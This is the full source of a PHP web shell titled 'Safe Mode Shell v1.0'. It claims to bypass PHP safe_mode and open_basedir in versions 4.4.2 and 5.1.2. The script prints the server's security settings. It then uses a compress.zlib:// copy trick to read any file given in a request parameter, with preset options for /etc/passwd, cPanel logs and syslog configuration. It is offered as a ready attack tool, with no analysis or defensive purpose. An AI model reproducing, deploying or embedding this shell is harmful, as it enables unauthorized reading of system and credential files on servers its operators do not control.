<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style>
<p align="center"><b><font face="Webdings" size="6" color="#FF0000">!</font><font face="Verdana" size="5" color="#DADADA"><a href="?	"><span style="color: #DADADA; text-decoration: none; font-weight:700"><font face="Times New Roman">Safe 
Mode Shell v1.0</font></span></a></font><font face="Webdings" size="6" color="#FF0000">!</font></b></p>
<form method="POST">
	<p align="center"><input type="text" name="file" size="20">
	<input type="submit" value="Open" name="B1"></p>
</form>
	<form method="POST">
		<p align="center"><select size="1" name="file">
		<option value="/etc/passwd">Get /etc/passwd</option>
		<option value="/var/cpanel/accounting.log">View cpanel logs</option>
		<option value="/etc/syslog.conf">Syslog configuration</option>
		<option value="/etc/hosts">Hosts</option>
		</select> <input type="submit" value="Go" name="B1"></p>
	</form>


<?php
/*
Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
by PHP Emperor<xb5@hotmail.com>
*/

echo "<head><title>Safe Mode Shell</title></head>"; 




$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">ON (secure)</font>";
}
else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
echo("Safe-mode: $hsafemode");
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
echo("<br>");
echo("Open base dir: $hopenbasedir");
echo("<br>");
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);

echo "<PRE>\n";
if(empty($file)){
if(empty($_GET['file'])){
if(empty($_POST['file'])){
die("\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\n <B><CENTER><FONT
COLOR=\"RED\">PHP Emperor
xb5@hotmail.com</FONT></CENTER></B>");
} else {
$file=$_POST['file'];
}
} else {
$file=$_GET['file'];
}
}

$temp=tempnam($tymczas, "cx");

if(copy("compress.zlib://".$file, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "<B>--- Start File ".htmlspecialchars($file)."
-------------</B>\n".htmlspecialchars($tekst)."\n<B>--- End File
".htmlspecialchars($file)." ---------------\n";
unlink($temp);
die("\n<FONT COLOR=\"RED\"><B>File
".htmlspecialchars($file)." has been already loaded. PHP Emperor <xb5@hotmail.com>
;]</B></FONT>");
} else {
die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
access.</CENTER></FONT>");
}
?>